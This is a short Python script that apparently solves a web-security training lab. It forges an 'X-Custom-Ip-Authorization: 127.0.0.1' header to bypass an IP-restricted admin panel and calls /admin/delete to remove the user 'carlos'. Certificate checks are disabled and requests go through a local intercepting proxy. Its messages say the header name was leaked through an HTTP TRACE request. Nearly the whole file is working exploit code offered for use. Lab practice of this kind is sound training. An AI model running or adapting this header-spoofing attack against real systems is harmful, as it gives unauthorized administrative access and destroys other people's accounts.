import requests
import sys
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1' , 'https' : 'http://127.0.0.1:8080'}

def delete_carlos(url):
    delete_carlos_function = "/admin/delete?username=carlos"
    headers = {'X-Custom-Ip-Authorization' : '127.0.0.1'}
    r = requests.get(url + delete_carlos_function, headers=headers, verify=False, proxies=proxies)
    if "User deleted successfully!" in r.text:
        return True
    else:
        return False

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example:%s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("[+] Testing for a 'Information Disclosure Vulnerability' which leads to account deletion.")
    print("[+] Using the HTTP methof 'TRACE' the remote server leak a http header needed to access the admin panel at /admin.")
    print("[+] The uthorization header is 'X-Custom-Ip-Authorization' which must be followed from a localhost IP address.")
    print("[+] Access the page /admin with no custom header, the webserver returns the error message: 'Admin interface only available to local users'")
    print("[+] Accessing the function '/admin/delete?username=carlos' to delete the user 'carlos'...")
    if not delete_carlos(url):
        print("[-] Something went wrong...")
        sys.exit(-1)
    print("[+] User 'carlos' deleted successfully!")


if __name__ == "__main__":
    main()